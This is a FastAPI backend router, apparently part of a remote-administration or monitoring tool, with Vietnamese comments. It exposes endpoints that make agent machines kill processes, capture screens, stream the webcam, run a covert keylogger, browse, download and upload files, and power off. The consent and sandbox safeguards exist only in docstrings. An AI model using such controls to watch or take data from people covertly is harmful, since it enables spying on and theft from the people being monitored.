# web-app/backend/routers/modules.py
from fastapi import APIRouter, HTTPException, Depends
from pydantic import BaseModel
from core.gateway_client import gateway_client  
from core.security import get_current_user  

router = APIRouter(prefix="/api/modules", tags=["Modules Control"])

# --- ĐỊNH NGHĨA KHUÔN MẪU DỮ LIỆU ĐẦU VÀO (DTO) ---
class KillProcessRequest(BaseModel):
    machine_id: str
    pid: int

class PowerRequest(BaseModel):
    machine_id: str
    action: str  # "shutdown", "restart", "lock", "sleep"

class FileDownloadRequest(BaseModel):
    machine_id: str
    file_path: str

class FileUploadRequest(BaseModel):
    machine_id: str
    file_path: str      # Thư mục đích nằm trong phạm vi Sandbox
    file_name: str      # Tên file muốn tạo
    file_base64: str    # Chuỗi dữ liệu tệp được mã hóa Base64 an toàn

class AppActionRequest(BaseModel):
    machine_id: str
    app_name: str

class BrowseDirectoryRequest(BaseModel):
    machine_id: str
    target_path: str

# =====================================================================
# 1️⃣ APPLICATION MANAGEMENT (Quản lý Ứng dụng)
# =====================================================================
@router.get("/applications/{machine_id}")
async def list_applications(machine_id: str, current_user: str = Depends(get_current_user)):
    """Đã bổ sung: Lấy danh sách các ứng dụng đang chạy cùng mức CPU."""
    try:
        data = await gateway_client.send_command_and_wait(machine_id, "application.list")
        return {"status": "success", "applications": data.get("applications", [])}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/applications/start")
async def start_application(data: AppActionRequest, current_user: str = Depends(get_current_user)):
    try:
        await gateway_client.send_command_and_wait(
            data.machine_id, "application.start", {"appName": data.app_name}
        )
        return {"status": "success", "message": f"Đã khởi chạy {data.app_name}."}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/applications/stop")
async def stop_application(data: AppActionRequest, current_user: str = Depends(get_current_user)):
    try:
        await gateway_client.send_command_and_wait(
            data.machine_id, "application.stop", {"appName": data.app_name}
        )
        return {"status": "success", "message": f"Đã đóng ứng dụng {data.app_name}."}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# =====================================================================
# 2️⃣ PROCESS MANAGEMENT (Quản lý Tiến trình Hệ thống)
# =====================================================================
@router.get("/processes/{machine_id}")
async def list_processes(machine_id: str, current_user: str = Depends(get_current_user)):
    """Đã bổ sung: Quét toàn bộ Task Manager từ máy Agent (Danh sách, CPU, RAM)."""
    try:
        data = await gateway_client.send_command_and_wait(machine_id, "process.list")
        return {"status": "success", "processes": data.get("processes", [])}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/processes/kill")
async def kill_process(data: KillProcessRequest, current_user: str = Depends(get_current_user)):
    try:
        await gateway_client.send_command_and_wait(
            data.machine_id, "process.kill", {"pid": data.pid}
        )
        return {"status": "success", "message": f"Đã hạ lệnh tắt tiến trình PID: {data.pid}."}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# =====================================================================
# 3️⃣ SCREEN MONITORING (Giám sát Màn hình)
# =====================================================================
@router.get("/screenshot/{machine_id}")
async def trigger_screenshot(machine_id: str, current_user: str = Depends(get_current_user)):
    try:
        agent_data = await gateway_client.send_command_and_wait(machine_id, "screen.screenshot")
        return {"status": "success", "screenshot_base64": agent_data.get("image_base64")}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/screen/live/start/{machine_id}")
async def start_live_screen(machine_id: str, current_user: str = Depends(get_current_user)):
    """Đã bổ sung: Phát tín hiệu yêu cầu mở màn hình trực tiếp (Cần End-User xác nhận)."""
    try:
        await gateway_client.send_command_and_wait(machine_id, "screen.live.start")
        return {"status": "success", "message": "Yêu cầu giám sát trực tiếp đã được gửi đi."}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/screen/live/stop/{machine_id}")
async def stop_live_screen(machine_id: str, current_user: str = Depends(get_current_user)):
    """Đã bổ sung: Đóng luồng Stream màn hình để giải phóng băng thông LAN."""
    try:
        await gateway_client.send_command_and_wait(machine_id, "screen.live.stop")
        return {"status": "success", "message": "Đã ngắt giám sát màn hình."}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# =====================================================================
# 4️⃣ WEBCAM STREAMING (Giám sát Camera)
# =====================================================================
@router.post("/webcam/start/{machine_id}")
async def start_webcam(machine_id: str, current_user: str = Depends(get_current_user)):
    """Đã bổ sung: Gửi lệnh bật Webcam (Phải hiện đèn chỉ báo đỏ trên máy user)."""
    try:
        await gateway_client.send_command_and_wait(machine_id, "webcam.start")
        return {"status": "success", "message": "Yêu cầu bật Webcam đã phát đi thành công."}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/webcam/stop/{machine_id}")
async def stop_webcam(machine_id: str, current_user: str = Depends(get_current_user)):
    """Đã bổ sung: Tắt luồng ghi hình Webcam."""
    try:
        await gateway_client.send_command_and_wait(machine_id, "webcam.stop")
        return {"status": "success", "message": "Đã tắt Webcam từ xa."}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# =====================================================================
# 5️⃣ KEYLOGGER (Theo dõi Bàn phím)
# =====================================================================
@router.post("/keylogger/start/{machine_id}")
async def start_keylogger(machine_id: str, current_user: str = Depends(get_current_user)):
    """Đã bổ sung: Kích hoạt Keylogger ngầm sau khi có xác nhận hợp pháp của user máy trạm."""
    try:
        await gateway_client.send_command_and_wait(machine_id, "keylogger.start")
        return {"status": "success", "message": "Hệ thống bắt đầu ghi nhận thao tác phím."}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/keylogger/stop/{machine_id}")
async def stop_keylogger(machine_id: str, current_user: str = Depends(get_current_user)):
    """Đã bổ sung: Ngắt chế độ ghi nhận phím gõ."""
    try:
        await gateway_client.send_command_and_wait(machine_id, "keylogger.stop")
        return {"status": "success", "message": "Đã dừng tiến trình Keylogger."}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# =====================================================================
# 6️⃣ FILE TRANSFER (Quản lý Tập tin - Có Sandbox bảo vệ)
# =====================================================================
@router.post("/file/browse")
async def browse_directory(data: BrowseDirectoryRequest, current_user: str = Depends(get_current_user)):
    try:
        agent_data = await gateway_client.send_command_and_wait(
            data.machine_id, "file.browse", {"targetPath": data.target_path}
        )
        return {
            "status": "success",
            "currentPath": agent_data.get("currentPath", ""),
            "files": agent_data.get("files", [])
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/file/download")
async def download_file_content(data: FileDownloadRequest, current_user: str = Depends(get_current_user)):
    try:
        agent_data = await gateway_client.send_command_and_wait(
            data.machine_id, "file.download", {"filePath": data.file_path}
        )
        return {
            "status": "success",
            "fileName": agent_data.get("fileName"),
            "fileBase64": agent_data.get("fileBase64") 
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/file/upload")
async def upload_file_to_client(data: FileUploadRequest, current_user: str = Depends(get_current_user)):
    """Đã bổ sung: Gửi tệp tin từ Admin chuyển xuống lưu trữ tại thư mục chỉ định của Agent."""
    try:
        await gateway_client.send_command_and_wait(
            data.machine_id, "file.upload", {
                "filePath": data.file_path,
                "fileName": data.file_name,
                "fileBase64": data.file_base64
            }
        )
        return {"status": "success", "message": "Tải tệp lên thư mục an toàn (Sandbox) thành công."}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# =====================================================================
# 7️⃣ POWER CONTROL (Điều khiển Nguồn điện)
# =====================================================================
@router.post("/power/control")
async def power_control(data: PowerRequest, current_user: str = Depends(get_current_user)):
    if data.action not in ["shutdown", "restart", "lock", "sleep"]:
        raise HTTPException(status_code=400, detail="Hành động nguồn không hợp lệ!")
    
    try:
        # Chuẩn hóa tên lệnh gửi đi dạng power.shutdown, power.restart...
        await gateway_client.send_command_and_wait(data.machine_id, f"power.{data.action}")
        return {"status": "success", "message": f"Đã thực hiện lệnh {data.action.upper()} viễn thông."}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))